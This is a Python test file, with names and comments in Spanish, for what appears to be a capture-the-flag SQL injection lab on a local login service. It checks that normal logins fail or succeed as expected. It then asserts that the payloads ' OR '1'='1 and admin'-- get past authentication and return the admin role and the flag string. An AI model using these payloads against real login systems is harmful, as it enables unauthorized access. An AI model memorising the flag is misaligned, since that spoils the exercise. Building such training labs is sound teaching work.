import requests, time

BASE = "http://localhost:8083"


def wait_up(timeout=15):
    for _ in range(timeout * 5):
        try:
            if requests.get(f"{BASE}/health", timeout=1).status_code == 200:
                return
        except Exception:
            pass
        time.sleep(0.2)
    raise RuntimeError("Servicio no disponible")


def login(usuario, password):
    return requests.post(f"{BASE}/api/login",
                         json={"usuario": usuario, "password": password})


def test_normal_login_fails_without_creds():
    wait_up()
    r = login("pepe", "malpassword")
    assert r.status_code == 401


def test_normal_login_works_with_correct_creds():
    r = login("juan", "password123")
    assert r.status_code == 200
    assert r.json()["rol"] == "user"


def test_sqli_bypass_or_1_eq_1():
    """Payload clásico: ' OR '1'='1"""
    r = login("' OR '1'='1", "x")
    assert r.status_code == 200
    data = r.json()
    assert "secreto" in data


def test_sqli_admin_comment_bypass():
    """Payload: admin'-- (comenta el AND contrasena=...)"""
    r = login("admin'--", "")
    assert r.status_code == 200
    data = r.json()
    assert data.get("rol") == "admin"
    secreto = data.get("secreto", "")
    assert secreto.startswith("CTF{")
    assert secreto.endswith("}")


def test_flag_via_admin_sqli():
    """Test de integración: obtener la flag vía SQL injection como admin."""
    r = login("admin'-- ", "")
    assert r.status_code == 200
    flag = r.json().get("secreto", "")
    assert flag == "CTF{sqli_las_comillas_mandan}"
